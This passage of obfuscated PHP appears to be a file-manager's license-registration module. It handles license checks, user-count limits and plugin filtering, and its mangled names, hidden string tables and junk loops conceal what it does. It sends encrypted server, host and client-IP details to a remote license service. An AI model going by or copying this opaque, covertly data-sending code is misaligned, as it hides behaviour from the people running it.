$this->ryqz82b69b80($¦¬ÎµÖ¼[27], array($this, $¦¬ÎµÖ¼[28])); $this->ryqz82b69b80($¦¬ÎµÖ¼[29], array($this, $¦¬ÎµÖ¼[30])); $this->ryqz82b69b80($¦¬ÎµÖ¼[31], array($this, $¦¬ÎµÖ¼[32])); } public function pxir017d8b8d($ıàŒŞøş) { $Ú¡¬ÚÛ‹ =& $_SERVER[¡¬ıÜ ƒ]; $ĞÎ‹›ˆ =& $_SERVER[Æıâ¹•]; $ÜîÚ¯Ôã = Model($ĞÎ‹›ˆ[33])->get(); $åÙßƒ–­ = $Ú¡¬ÚÛ‹[713]; if (strlen($åÙßƒ–­) < $Ú¡¬ÚÛ‹[691]) { die; } $ÔÜ¿şá™ = array($ĞÎ‹›ˆ[34], $ĞÎ‹›ˆ[35], $ĞÎ‹›ˆ[36], $ĞÎ‹›ˆ[37], $ĞÎ‹›ˆ[38], $ĞÎ‹›ˆ[39], $ĞÎ‹›ˆ[40], $ĞÎ‹›ˆ[41], $ĞÎ‹›ˆ[42], $ĞÎ‹›ˆ[43], $ĞÎ‹›ˆ[44], $ĞÎ‹›ˆ[45], $ĞÎ‹›ˆ[46], $ĞÎ‹›ˆ[47], $ĞÎ‹›ˆ[48], $ĞÎ‹›ˆ[49], $ĞÎ‹›ˆ[50], $ĞÎ‹›ˆ[51], $ĞÎ‹›ˆ[52], $ĞÎ‹›ˆ[53], $ĞÎ‹›ˆ[54], $ĞÎ‹›ˆ[55], $ĞÎ‹›ˆ[56], $ĞÎ‹›ˆ[57], $ĞÎ‹›ˆ[58], $ĞÎ‹›ˆ[59], $ĞÎ‹›ˆ[60], $ĞÎ‹›ˆ[61], $ĞÎ‹›ˆ[62], $ĞÎ‹›ˆ[63], $ĞÎ‹›ˆ[64], $ĞÎ‹›ˆ[65], $ĞÎ‹›ˆ[66], $ĞÎ‹›ˆ[67], $ĞÎ‹›ˆ[68], $ĞÎ‹›ˆ[69], $ĞÎ‹›ˆ[70], $ĞÎ‹›ˆ[71], $ĞÎ‹›ˆ[72], $ĞÎ‹›ˆ[73], $ĞÎ‹›ˆ[74], $ĞÎ‹›ˆ[75], $ĞÎ‹›ˆ[76], $ĞÎ‹›ˆ[77], $ĞÎ‹›ˆ[78], $ĞÎ‹›ˆ[79], $ĞÎ‹›ˆ[80], $ĞÎ‹›ˆ[81], $ĞÎ‹›ˆ[82], $ĞÎ‹›ˆ[83], $ĞÎ‹›ˆ[84], $ĞÎ‹›ˆ[85]); foreach ($ÔÜ¿şá™ as $¨î¿Õä²) { $¼Ğï½À = $GLOBALS[$ĞÎ‹›ˆ[86]][$ĞÎ‹›ˆ[87]][$¨î¿Õä²]; if (isset($ÜîÚ¯Ôã[$¨î¿Õä²])) { $¼Ğï½À = $ÜîÚ¯Ôã[$¨î¿Õä²]; } $ıàŒŞøş[$ĞÎ‹›ˆ[88]][$ĞÎ‹›ˆ[89]][$¨î¿Õä²] = $¼Ğï½À; } $Ñİ±–î = $ıàŒŞøş[$ĞÎ‹›ˆ[88]][$ĞÎ‹›ˆ[89]][$ĞÎ‹›ˆ[46]]; $õÎŒ”ù = $Ú¡¬ÚÛ‹[714]; while (strlen($õÎŒ”ù) < $Ú¡¬ÚÛ‹[688]) { if (!$õÎŒ”ù) { break; } $õÎŒ”ù++; } unset($ıàŒŞøş[$ĞÎ‹›ˆ[88]][$ĞÎ‹›ˆ[90]][$ĞÎ‹›ˆ[91]]); $ãë¤äÊ› = $Ú¡¬ÚÛ‹[715]; if (!$ãë¤äÊ›) { return; } unset($ıàŒŞøş[$ĞÎ‹›ˆ[88]][$ĞÎ‹›ˆ[90]][$ĞÎ‹›ˆ[92]]); $º¸Î¨ë• = $Ú¡¬ÚÛ‹[716]; unset($ıàŒŞøş[$ĞÎ‹›ˆ[88]][$ĞÎ‹›ˆ[89]][$ĞÎ‹›ˆ[46]]); $ÖªšáÅ = $Ú¡¬ÚÛ‹[717]; if (strlen($ÖªšáÅ) < $Ú¡¬ÚÛ‹[697]) { return; } unset($ıàŒŞøş[$ĞÎ‹›ˆ[88]][$ĞÎ‹›ˆ[89]][$ĞÎ‹›ˆ[93]]); $Ş»šËÒ = $Ú¡¬ÚÛ‹[718]; if (strlen($Ş»šËÒ) < $Ú¡¬ÚÛ‹[710]) { return; } $ıàŒŞøş[$ĞÎ‹›ˆ[88]][$ĞÎ‹›ˆ[89]][$ĞÎ‹›ˆ[94]] = array($ĞÎ‹›ˆ[95] => (int) $Ñİ±–î[$ĞÎ‹›ˆ[96]], $ĞÎ‹›ˆ[97] => (int) _get($Ñİ±–î, $ĞÎ‹›ˆ[98], 0)); $ğÅéş‘ô = $Ú¡¬ÚÛ‹[719]; while ($ğÅéş‘ô < $Ú¡¬ÚÛ‹[688]) { if ($ğÅéş‘ô >= 0) { break; } $ğÅéş‘ô++; } $ş¡£æ°À = substr(md5($ĞÎ‹›ˆ[99] . get_client_ip() . $ÜîÚ¯Ôã[$ĞÎ‹›ˆ[100]]), 0, 15); $Ò¾úŞô¥ = $Ú¡¬ÚÛ‹[720]; if (strlen($Ò¾úŞô¥) < $Ú¡¬ÚÛ‹[691]) { return; } $ıàŒŞøş[$ĞÎ‹›ˆ[101]][$ĞÎ‹›ˆ[102]] = Mcrypt::encode(Session::sign(), $ş¡£æ°À, 3600 * 24); $ıàŒŞøş[$ĞÎ‹›ˆ[101]][$ĞÎ‹›ˆ[103]] = Action($ĞÎ‹›ˆ[104])->accessToken(); $ıàŒŞøş[$ĞÎ‹›ˆ[101]][$ĞÎ‹›ˆ[105]] = md5($_SERVER[$ĞÎ‹›ˆ[106]] . $ÜîÚ¯Ôã[$ĞÎ‹›ˆ[100]]); $ıàŒŞøş[$ĞÎ‹›ˆ[101]][$ĞÎ‹›ˆ[107]] = base64_encode(serverInfo()); $šòÕ¯’ë = $Ú¡¬ÚÛ‹[721]; if (!$šòÕ¯’ë) { die; } $ıàŒŞøş[$ĞÎ‹›ˆ[101]][$ĞÎ‹›ˆ[108]] = $this->ksvb63ffc96b; $Â¨åÓ“ş = $Ú¡¬ÚÛ‹[722]; if (!$Â¨åÓ“ş) { die; } if ($ÜîÚ¯Ôã[$ĞÎ‹›ˆ[108]] != $ĞÎ‹›ˆ[109]) { $ıàŒŞøş[$ĞÎ‹›ˆ[101]][$ĞÎ‹›ˆ[110]] = $ÜîÚ¯Ôã[$ĞÎ‹›ˆ[110]]; $ıàŒŞøş[$ĞÎ‹›ˆ[101]][$ĞÎ‹›ˆ[111]] = $ÜîÚ¯Ôã[$ĞÎ‹›ˆ[111]]; $‰‹ªÅ“œ = rand_string(10) . $this->ksvb63ffc96b . rand_string(5); $ıàŒŞøş[$ĞÎ‹›ˆ[88]][$ĞÎ‹›ˆ[112]][$ĞÎ‹›ˆ[113]] = $this->djxu6123a2cc($‰‹ªÅ“œ, $ıàŒŞøş[$ĞÎ‹›ˆ[101]][$ĞÎ‹›ˆ[105]]); } if ($this->ksvb63ffc96b == $ĞÎ‹›ˆ[109]) { $ıàŒŞøş[$ĞÎ‹›ˆ[88]][$ĞÎ‹›ˆ[89]][$ĞÎ‹›ˆ[94]][$ĞÎ‹›ˆ[98]] = 0; } $ıàŒŞøş[$ĞÎ‹›ˆ[101]][$ĞÎ‹›ˆ[114]] = $this->versionPluginFilter(); $ıàŒŞøş[$ĞÎ‹›ˆ[101]][$ĞÎ‹›ˆ[115]] = _get($this->hwmr43eff4f3, $ĞÎ‹›ˆ[116], $ĞÎ‹›ˆ[6]); if (KodUser::isRoot() && $this->config[$ĞÎ‹›ˆ[117]]) { $ıàŒŞøş[$ĞÎ‹›ˆ[101]][$ĞÎ‹›ˆ[118]] = WEB_ROOT; } return $ıàŒŞøş; } private function chmj9e8ba543() { $¨Í»Ó½¨ =& $_SERVER[¡¬ıÜ ƒ]; $øæª§‡ =& $_SERVER[Æıâ¹•]; $¥èÆĞ’É = $_SERVER[$øæª§‡[24]] == $øæª§‡[119]; $çÂ’ŸÛ = $¨Í»Ó½¨[723]; if (!$çÂ’ŸÛ) { return; } if ($_SERVER[$øæª§‡[24]] == $øæª§‡[120] && $_GET[$øæª§‡[121]] == $øæª§‡[122]) { $¥èÆĞ’É = !0; } if ($¥èÆĞ’É) { $™¦„ô¿ù = array($øæª§‡[108] => $this->ksvb63ffc96b, $øæª§‡[123] => $this->wdve121bf84f(), $øæª§‡[124] => Model($øæª§‡[125])->count()); if ($this->ksvb63ffc96b != $øæª§‡[109]) { $Êâ–œ…® = _get($this->hwmr43eff4f3, $øæª§‡[126]); if ($Êâ–œ…®) { $™¦„ô¿ù[$øæª§‡[127]] = $Êâ–œ…®; $™¦„ô¿ù[$øæª§‡[128]] = strtotime(_get($this->hwmr43eff4f3, $øæª§‡[129])); $™¦„ô¿ù[$øæª§‡[130]] = _get($this->hwmr43eff4f3, $øæª§‡[116]); } $ò‡æ©š = Model($øæª§‡[33])->get($øæª§‡[131], $øæª§‡[6], !0); if (is_string($ò‡æ©š) && substr($ò‡æ©š, 0, 1) == $øæª§‡[132]) { $ò‡æ©š = json_decode_force($ò‡æ©š); } if (is_array($ò‡æ©š) && $ò‡æ©š[$øæª§‡[133]] && strstr($ò‡æ©š[$øæª§‡[133]], $øæª§‡[134])) { $µ¢§Šı´ = explode($øæª§‡[134], $ò‡æ©š[$øæª§‡[133]]); $™¦„ô¿ù[$øæª§‡[135]] = $µ¢§Šı´[0]; } } $™¦„ô¿ù = $this->lwdn8a56ea14(json_encode($™¦„ô¿ù), md5($øæª§‡[136])); $»ĞâúĞ = $¨Í»Ó½¨[724]; while (strlen($»ĞâúĞ) < $¨Í»Ó½¨[697]) { if (!$»ĞâúĞ) { break; } $»ĞâúĞ++; } $è‘®·¦ = array($øæª§‡[137] => $™¦„ô¿ù); $àËĞş™© = $¨Í»Ó½¨[725]; while ($àËĞş™© < $¨Í»Ó½¨[710]) { if ($àËĞş™© >= 0) { break; } $àËĞş™©++; } call_user_func(array($øæª§‡[138], $øæª§‡[139]), $è‘®·¦); } if ($this->ksvb63ffc96b == $øæª§‡[109]) { return; } $¤ü´Åúš = array($øæª§‡[140], $øæª§‡[141], $øæª§‡[142], $øæª§‡[143], $øæª§‡[144], $øæª§‡[145]); $ûç˜ÓâŸ = $¨Í»Ó½¨[725]; while ($ûç˜ÓâŸ < $¨Í»Ó½¨[688]) { if ($ûç˜ÓâŸ >= 0) { break; } $ûç˜ÓâŸ++; } $ÆîıãÔ = Model($øæª§‡[33])->get(); $˜…ş²Òû = $¨Í»Ó½¨[726]; if (!$˜…ş²Òû) { die; } $è‘®·¦ = array($øæª§‡[146] => $ÆîıãÔ[$øæª§‡[34]], $øæª§‡[147] => $ÆîıãÔ[$øæª§‡[35]], $øæª§‡[148] => $øæª§‡[6]); $Ï¤ÄÍ¥ = $¨Í»Ó½¨[727]; if (!$Ï¤ÄÍ¥) { die; } foreach ($¤ü´Åúš as $é„¬ı‹í) { if (!isset($ÆîıãÔ[$é„¬ı‹í]) || !$ÆîıãÔ[$é„¬ı‹í]) { continue; } $è‘®·¦[$é„¬ı‹í] = $ÆîıãÔ[$é„¬ı‹í]; $Åïß˜ß = $¨Í»Ó½¨[728]; } call_user_func(array($øæª§‡[138], $øæª§‡[139]), $è‘®·¦); $ÉŠÖúÜ» = $¨Í»Ó½¨[729]; while (strlen($ÉŠÖúÜ») < $¨Í»Ó½¨[688]) { if (!$ÉŠÖúÜ») { break; } $ÉŠÖúÜ»++; } } private function jevt7a20daae() { $‡¼ı¼Ñ† =& $_SERVER[¡¬ıÜ ƒ]; $Ï·Î¡™ß =& $_SERVER[Æıâ¹•]; if ($_SERVER[$Ï·Î¡™ß[24]] != $Ï·Î¡™ß[149]) { return; } if (!KodUser::isRoot()) { die; } $àÂï©øß = $GLOBALS[$Ï·Î¡™ß[13]]; if (isset($àÂï©øß[$Ï·Î¡™ß[150]])) { $this->qubg7b56c0a7(); die; } if (isset($àÂï©øß[$Ï·Î¡™ß[151]]) && isset($àÂï©øß[$Ï·Î¡™ß[151]]) == $Ï·Î¡™ß[122]) { $àÂï©øß[$Ï·Î¡™ß[152]] = Model($Ï·Î¡™ß[33])->get($Ï·Î¡™ß[153]); } if (!isset($àÂï©øß[$Ï·Î¡™ß[152]]) || strlen($àÂï©øß[$Ï·Î¡™ß[152]]) != 16) { show_json($Ï·Î¡™ß[154] . $àÂï©øß[$Ï·Î¡™ß[152]], !1); } $ˆ³Æ–’À = Model($Ï·Î¡™ß[33])->get($Ï·Î¡™ß[100]); $Šß¬—Ÿª = md5($_SERVER[$Ï·Î¡™ß[106]] . $ˆ³Æ–’À); $¶ô‹«Œç = array($Ï·Î¡™ß[152] => $àÂï©øß[$Ï·Î¡™ß[152]], $Ï·Î¡™ß[155] => rand_string(16), $Ï·Î¡™ß[156] => $Ï·Î¡™ß[136], $Ï·Î¡™ß[157] => $Ï·Î¡™ß[158], $Ï·Î¡™ß[159] => $_SERVER[$Ï·Î¡™ß[160]], $Ï·Î¡™ß[161] => $_SERVER[$Ï·Î¡™ß[162]], $Ï·Î¡™ß[163] => $_SERVER[$Ï·Î¡™ß[164]], $Ï·Î¡™ß[105] => $Šß¬—Ÿª, $Ï·Î¡™ß[165] => Model($Ï·Î¡™ß[33])->get($Ï·Î¡™ß[131])); if (isset($àÂï©øß[$Ï·Î¡™ß[151]]) && isset($àÂï©øß[$Ï·Î¡™ß[151]]) == $Ï·Î¡™ß[122]) { $¶ô‹«Œç[$Ï·Î¡™ß[151]] = md5($¶ô‹«Œç[$Ï·Î¡™ß[152]] . $Ï·Î¡™ß[166] . $¶ô‹«Œç[$Ï·Î¡™ß[155]]); } if ($àÂï©øß[$Ï·Î¡™ß[167]] == $Ï·Î¡™ß[168]) { $‚ÛåÌ°ê = $this->lwdn8a56ea14($Šß¬—Ÿª, $Ï·Î¡™ß[169]); $Ô½«ò³½ = $this->djxu6123a2cc(json_encode($¶ô‹«Œç), $Šß¬—Ÿª . $Ï·Î¡™ß[170], 3); $Ô½«ò³½ = $Ô½«ò³½ . $Ï·Î¡™ß[171] . $_SERVER[$Ï·Î¡™ß[160]]; $Šç‘Şçî = $this->qwxtcd77bccf($Ï·Î¡™ß[172] . $‚ÛåÌ°ê . $Ï·Î¡™ß[173] . $Ô½«ò³½, -1); show_json($Šç‘Şçî, !0); } else { if ($àÂï©øß[$Ï·Î¡™ß[167]] == $Ï·Î¡™ß[174]) { $üÔ¤Ã²ş = substr(md5($Ï·Î¡™ß[175] . $Šß¬—Ÿª), 12, 15) . $Ï·Î¡™ß[176]; $Ô½«ò³½ = $this->mngvc29f5971(trim($àÂï©øß[$Ï·Î¡™ß[177]]), $üÔ¤Ã²ş, 2); $¾®×ñÛÖ = json_decode($Ô½«ò³½, !0); if (!is_array($¾®×ñÛÖ) || !is_array($¾®×ñÛÖ[$Ï·Î¡™ß[178]]) || $¾®×ñÛÖ[$Ï·Î¡™ß[152]] != !0) { $ã·“¿à• = $Ï·Î¡™ß[179]; $ß›‰¯— = $¾®×ñÛÖ[$Ï·Î¡™ß[178]] ? $Ï·Î¡™ß[180] . $¾®×ñÛÖ[$Ï·Î¡™ß[178]] : $ã·“¿à•; show_json($ß›‰¯—, !1); } else { $¶ô‹«Œç[$Ï·Î¡™ß[155]] = $¾®×ñÛÖ[$Ï·Î¡™ß[178]][$Ï·Î¡™ß[181]]; } } else { $¾®×ñÛÖ = $this->qwxtcd77bccf($Ï·Î¡™ß[182], $¶ô‹«Œç, 10); $à†Ùë¥‹ = $‡¼ı¼Ñ†[730]; if (strlen($à†Ùë¥‹) < $‡¼ı¼Ñ†[688]) { die; } } } if (!is_array($¾®×ñÛÖ) || !is_array($¾®×ñÛÖ[$Ï·Î¡™ß[178]]) || $¾®×ñÛÖ[$Ï·Î¡™ß[152]] != !0) { $ã·“¿à• = LNG($Ï·Î¡™ß[183]); $ß›‰¯— = $¾®×ñÛÖ[$Ï·Î¡™ß[178]] ? $Ï·Î¡™ß[180] . $¾®×ñÛÖ[$Ï·Î¡™ß[178]] : $ã·“¿à•; show_json($ß›‰¯—, !1); } $Ÿ¨»áÆ® = $¾®×ñÛÖ[$Ï·Î¡™ß[178]]; $Êì›Í´ö = $this->crvbb3cafbba($Ÿ¨»áÆ®[$Ï·Î¡™ß[184]]); if (!$Êì›Í´ö || $Êì›Í´ö != $Ÿ¨»áÆ®[$Ï·Î¡™ß[129]]) { $æÙ¡Ï’‡ = array($Ï·Î¡™ß[185] => Model($Ï·Î¡™ß[33])->get($Ï·Î¡™ß[100]), $Ï·Î¡™ß[186] => $_SERVER[$Ï·Î¡™ß[106]], $Ï·Î¡™ß[187] => this_url(), $Ï·Î¡™ß[161] => $_SERVER[$Ï·Î¡™ß[162]]); $Ô½«ò³½ = $this->tyqb3438ed3d(json_encode($æÙ¡Ï’‡)); $this->qwxtcd77bccf($Ï·Î¡™ß[188] . $Ô½«ò³½); show_json(LNG($Ï·Î¡™ß[189]), !0); } $Ä—Š–» = array($Ï·Î¡™ß[153] => $Ÿ¨»áÆ®[$Ï·Î¡™ß[190]], $Ï·Î¡™ß[191] => $Ÿ¨»áÆ®[$Ï·Î¡™ß[192]], $Ï·Î¡™ß[193] => rand_string(16), $Ï·Î¡™ß[108] => $Ÿ¨»áÆ®[$Ï·Î¡™ß[194]]); if ($¶ô‹«Œç[$Ï·Î¡™ß[155]]) { $Ä—Š–»[$Ï·Î¡™ß[193]] = $¶ô‹«Œç[$Ï·Î¡™ß[155]]; } $ü‡‡ŠÍ¸ = substr(md5($Ä—Š–»[$Ï·Î¡™ß[191]]), 10, 10); $Ó˜ú‡ÇÕ = $ü‡‡ŠÍ¸ . $Ä—Š–»[$Ï·Î¡™ß[108]] . $Ä—Š–»[$Ï·Î¡™ß[193]]; $Ä—Š–»[$Ï·Î¡™ß[110]] = strrev(base64_encode($this->lwdn8a56ea14($Ó˜ú‡ÇÕ, $Ï·Î¡™ß[195]))); $†¥èğ¿ò = rand_string(16); $ÅÌèø¸À = $‡¼ı¼Ñ†[731]; if (!$ÅÌèø¸À) { return; } $¿‹×ï = $†¥èğ¿ò . $Ä—Š–»[$Ï·Î¡™ß[108]] . $this->lwdn8a56ea14(md5($Ä—Š–»[$Ï·Î¡™ß[153]]), $†¥èğ¿ò); $Áõ×äÛÃ = $‡¼ı¼Ñ†[732]; while ($Áõ×äÛÃ < $‡¼ı¼Ñ†[697]) { if ($Áõ×äÛÃ >= 0) { break; } $Áõ×äÛÃ++; } $Ä—Š–»[$Ï·Î¡™ß[111]] = base64_encode(strrev($this->lwdn8a56ea14($¿‹×ï, $Ï·Î¡™ß[196]))); $ ¤ò¿±º = $‡¼ı¼Ñ†[733]; while (strlen($ ¤ò¿±º) < $‡¼ı¼Ñ†[710]) { if (!$ ¤ò¿±º) { break; } $ ¤ò¿±º++; } if ($Ÿ¨»áÆ®[$Ï·Î¡™ß[197]] && $Ÿ¨»áÆ®[$Ï·Î¡™ß[197]] >= 1) { Model($Ï·Î¡™ß[33])->setDeep($Ï·Î¡™ß[198], $Ï·Î¡™ß[122]); } Model($Ï·Î¡™ß[33])->set($Ä—Š–»); $İ× £‰Â = md5($_SERVER[$Ï·Î¡™ß[106]] . strrev($ˆ³Æ–’À) . $Ä—Š–»[$Ï·Î¡™ß[191]]); $Áï£…Ğº = $‡¼ı¼Ñ†[734]; $’“Á†Ö½ = strrev(substr($İ× £‰Â, 10, 16)); $Ù­â¼ƒğ = $this->djxu6123a2cc(json_encode($Ÿ¨»áÆ®), $İ× £‰Â); $‰Ã¢ıªÕ = array_to_keyvalue(Model($Ï·Î¡™ß[7])->listData(), $Ï·Î¡™ß[199]); $Ö‚”§÷å = $‰Ã¢ıªÕ[$Ï·Î¡™ß[200]]; $¡î·Ê¹­ = $‡¼ı¼Ñ†[735]; if (strlen($¡î·Ê¹­) < $‡¼ı¼Ñ†[710]) { die; } $Äë¯±€„ = array(); $Äë¯±€„[$’“Á†Ö½] = $Ù­â¼ƒğ; Model($Ï·Î¡™ß[7])->update($Ö‚”§÷å[$Ï·Î¡™ß[201]], array($Ï·Î¡™ß[202] => $Äë¯±€„)); $this->hwmr43eff4f3 = $Ÿ¨»áÆ®; $this->ksvb63ffc96b = $Ä—Š–»[$Ï·Î¡™ß[108]]; $this->licenseRegistSuccess(); Cache::set($Ï·Î¡™ß[203] . md5($ˆ³Æ–’À . $Ï·Î¡™ß[204]), $Ï·Î¡™ß[6]); show_json(LNG($Ï·Î¡™ß[189]), !0); $§»ãŞö = $‡¼ı¼Ñ†[736]; if (!$§»ãŞö) { return; } } private function licenseRegistSuccess() { $²¢ßóóì =& $_SERVER[Æıâ¹•]; $ş‰ºû«¼ = Model($²¢ßóóì[33])->get(); $­±­« Ó = $_SERVER[¡¬ıÜ ƒ][737]; if (!$­±­« Ó) { return; } if ($ş‰ºû«¼[$²¢ßóóì[63]] != $²¢ßóóì[122]) { Model($²¢ßóóì[33])->set($²¢ßóóì[63], $²¢ßóóì[122]); } Action($²¢ßóóì[205])->initStart(!0); } private function qubg7b56c0a7() { $º‡¹Ü¦¦ =& $_SERVER[¡¬ıÜ ƒ]; $ô·¾° =& $_SERVER[Æıâ¹•]; Model($ô·¾°[33])->set(array($ô·¾°[153] => $ô·¾°[6], $ô·¾°[191] => $ô·¾°[6], $ô·¾°[108] => $ô·¾°[109], $ô·¾°[110] => $ô·¾°[6], $ô·¾°[111] => $ô·¾°[6])); $íËÍÜĞ = $º‡¹Ü¦¦[738]; Model($ô·¾°[33])->setDeep($ô·¾°[198], $ô·¾°[206]); $œ£ãĞÁ± = $º‡¹Ü¦¦[739]; if (strlen($œ£ãĞÁ±) < $º‡¹Ü¦¦[710]) { die; } $this->hwmr43eff4f3 = array(); $this->ksvb63ffc96b = $ô·¾°[109]; $ÎåâïÃš = $º‡¹Ü¦¦[740]; while (strlen($ÎåâïÃš) < $º‡¹Ü¦¦[710]) { if (!$ÎåâïÃš) { break; } $ÎåâïÃš++; } } private function cdsq88524c7b() { $½«’÷®Ï =& $_SERVER[¡¬ıÜ ƒ]; $ÒƒÂ»Ëà =& $_SERVER[Æıâ¹•]; $_SERVER[$ÒƒÂ»Ëà[162]] = _get($_SERVER, $ÒƒÂ»Ëà[162], APP_HOST); $this->ksvb63ffc96b = $ÒƒÂ»Ëà[109]; $¹äÖÚ±á = Model($ÒƒÂ»Ëà[33])->get(); $ÃÑœÉ“ = $½«’÷®Ï[741]; if (!$ÃÑœÉ“) { die; } if ($¹äÖÚ±á[$ÒƒÂ»Ëà[108]] == $ÒƒÂ»Ëà[109]) { return; } $ÛÔÚíí = Model($ÒƒÂ»Ëà[33])->get($ÒƒÂ»Ëà[100]); $¯¢‹Å³ñ = $ÒƒÂ»Ëà[203] . md5($ÛÔÚíí . $ÒƒÂ»Ëà[204]); $–¬ÍäÏ™ = Cache::get($¯¢‹Å³ñ); if (!is_array($–¬ÍäÏ™) || !isset($–¬ÍäÏ™[$ÒƒÂ»Ëà[207]]) || time() - $–¬ÍäÏ™[$ÒƒÂ»Ëà[207]] >= 60) { $ùÔ€Óº¢ = Model($ÒƒÂ»Ëà[7])->loadList(); $õë¥ıáö = $ùÔ€Óº¢[$ÒƒÂ»Ëà[200]]; $Õ›ä±ëÀ = md5($_SERVER[$ÒƒÂ»Ëà[106]] . strrev($ÛÔÚíí) . $¹äÖÚ±á[$ÒƒÂ»Ëà[191]]); $†¸¦˜óä = strrev(substr($Õ›ä±ëÀ, 10, 16)); $–¬ÍäÏ™ = $this->mngvc29f5971($õë¥ıáö[$ÒƒÂ»Ëà[86]][$†¸¦˜óä], $Õ›ä±ëÀ); $–¬ÍäÏ™ = json_decode($–¬ÍäÏ™, !0); } if (!is_array($–¬ÍäÏ™)) { return $this->qubg7b56c0a7(); } $‚»ñØĞ = strtotime($–¬ÍäÏ™[$ÒƒÂ»Ëà[129]]); if (time() >= $‚»ñØĞ) { return $this->qubg7b56c0a7(); } if (!isset($–¬ÍäÏ™[$ÒƒÂ»Ëà[207]]) || time() - $–¬ÍäÏ™[$ÒƒÂ»Ëà[207]] > 20) { $–¬ÍäÏ™[$ÒƒÂ»Ëà[207]] = time(); Cache::set($¯¢‹Å³ñ, $–¬ÍäÏ™); } $this->hwmr43eff4f3 = $–¬ÍäÏ™; $this->ksvb63ffc96b = $¹äÖÚ±á[$ÒƒÂ»Ëà[108]]; $¹·ïëÑÆ = $½«’÷®Ï[742]; } private function mnrs1fbcb399() { $ëõÇº¹ =& $_SERVER[¡¬ıÜ ƒ]; $€çÉ¡‰‘ =& $_SERVER[Æıâ¹•]; $æíƒÀéõ = $GLOBALS[$€çÉ¡‰‘[13]]; $ô÷´æ = $ëõÇº¹[743]; if (strlen($ô÷´æ) < $ëõÇº¹[744]) { return; } $ßæÅÌ¡ = $_SERVER[$€çÉ¡‰‘[24]]; $·šù«­° = $ëõÇº¹[731]; if (!$·šù«­°) { return; } if ($ßæÅÌ¡ == $€çÉ¡‰‘[208] && $this->ksvb63ffc96b == $€çÉ¡‰‘[109]) { show_json(LNG($€çÉ¡‰‘[209]), !1, $€çÉ¡‰‘[210]); } $¸¶ÈªìÑ = array($€çÉ¡‰‘[211], $€çÉ¡‰‘[212]); if (in_array($ßæÅÌ¡, $¸¶ÈªìÑ)) { if ($this->ksvb63ffc96b == $€çÉ¡‰‘[109] && isset($æíƒÀéõ[$€çÉ¡‰‘[213]])) { show_json(LNG($€çÉ¡‰‘[209]), !1, $€çÉ¡‰‘[210]); die; } $ôïôÒÆ£ = $this->wdve121bf84f(); if ($ôïôÒÆ£ != intval($€çÉ¡‰‘[214])) { if ($ôïôÒÆ£ <= Model($€çÉ¡‰‘[125])->count()) { show_json(LNG($€çÉ¡‰‘[215]), !1, $€çÉ¡‰‘[210]); die; } } } } private function tvlcdec16053() { $”æš•Ï =& $_SERVER[¡¬ıÜ ƒ]; $ç€ø“¾Ã =& $_SERVER[Æıâ¹•]; $¥ÏÆ¶ã = array($ç€ø“¾Ã[119], $ç€ø“¾Ã[120]); $Õô¯ş‡Î = $”æš•Ï[745]; if (!KodUser::isRoot() || !isset($_GET[$ç€ø“¾Ã[216]])) { return; } if (!in_array($_SERVER[$ç€ø“¾Ã[24]], $¥ÏÆ¶ã)) { return; } $Ä¬‘¢è— = $ç€ø“¾Ã[217]; $âç³Èó = $”æš•Ï[746]; while (strlen($âç³Èó) < $”æš•Ï[697]) { if (!$âç³Èó) { break; } $âç³Èó++; } $Ä¬‘¢è— = $this->tilf0e36ffdb($Ä¬‘¢è—, $ç€ø“¾Ã[218]); $†ÌĞ¾œ = $”æš•Ï[747]; if (!$†ÌĞ¾œ) { return; } $ºÜÃ²¾å = stream_context_create(array($ç€ø“¾Ã[219] => array($ç€ø“¾Ã[220] => $ç€ø“¾Ã[221], $ç€ø“¾Ã[222] => 3))); $‘Ã’¨¯® = @file_get_contents($Ä¬‘¢è—, !1, $ºÜÃ²¾å); $¾Èäãúó = $”æš•Ï[748]; header($ç€ø“¾Ã[223]); $É—™¡Ô = $”æš•Ï[749]; if ($‘Ã’¨¯® && strstr($‘Ã’¨¯®, $ç€ø“¾Ã[224])) { echo $‘Ã’¨¯®; } die; } public function mhacdb45867b($¬öŞš”ú) { $¦‡æúéÛ =& $_SERVER[¡¬ıÜ ƒ]; $àÜóƒí× =& $_SERVER[Æıâ¹•]; if ($this->ksvb63ffc96b == $àÜóƒí×[225]) { return $¬öŞš”ú; } $½ÛÀƒÜ = $this->versionPluginList(); $†àåÑùï = $¦‡æúéÛ[750]; if (strlen($†àåÑùï) < $¦‡æúéÛ[697]) { return; } $¬°Ê» = explode($àÜóƒí×[226], $this->versionPluginFilter()); $Ü¨ÔÕ»‘ = array(); $¡†¤ïÛª = $¦‡æúéÛ[751]; if (!$¡†¤ïÛª) { die; } foreach ($½ÛÀƒÜ as $†¬Úéåİ => $œøµ×Ó•) { if ($œøµ×Ó• == $àÜóƒí×[227] && substr($this->ksvb63ffc96b, 0, 1) == $àÜóƒí×[227]) { continue; } if (!in_array($†¬Úéåİ, $¬°Ê»)) { $Ü¨ÔÕ»‘[] = $†¬Úéåİ; } } foreach ($Ü¨ÔÕ»‘ as $†¬Úéåİ) { unset($¬öŞš”ú[$†¬Úéåİ]); } return $¬öŞš”ú; } private function versionPluginList() { $öíúşĞ =& $_SERVER[Æıâ¹•]; return array($öíúşĞ[228] => $öíúşĞ[227], $öíúşĞ[229] => $öíúşĞ[227], $öíúşĞ[230] => $öíúşĞ[227], $öíúşĞ[231] => $öíúşĞ[232], $öíúşĞ[233] => $öíúşĞ[232], $öíúşĞ[234] => $öíúşĞ[232], $öíúşĞ[235] => $öíúşĞ[232], $öíúşĞ[236] => $öíúşĞ[232], $öíúşĞ[237] => $öíúşĞ[232], $öíúşĞ[238] => $öíúşĞ[232], $öíúşĞ[239] => $öíúşĞ[232], $öíúşĞ[240] => $öíúşĞ[232], $öíúşĞ[241] => $öíúşĞ[232], $öíúşĞ[242] => $öíúşĞ[232], $öíúşĞ[243] => $öíúşĞ[232], $öíúşĞ[244] => $öíúşĞ[232]); } private function versionPluginFilter() { $Ç˜Ş«­î =& $_SERVER[Æıâ¹•]; if ($this->ksvb63ffc96b == $Ç˜Ş«­î[109]) { return $Ç˜Ş«­î[6]; } $„Â‰¬†¨ = _get($this->hwmr43eff4f3, $Ç˜Ş«­î[245], $Ç˜Ş«­î[6]); $©—ÂŸê = _get($this->hwmr43eff4f3, $Ç˜Ş«­î[116], $Ç˜Ş«­î[6]); $†Š²¥¶À = _get($this->hwmr43eff4f3, $Ç˜Ş«­î[246], $Ç˜Ş«­î[6]); if ($©—ÂŸê > time() && $†Š²¥¶À > time()) { $¦Í“¯ŒÄ = explode($Ç˜Ş«­î[226], $„Â‰¬†¨); 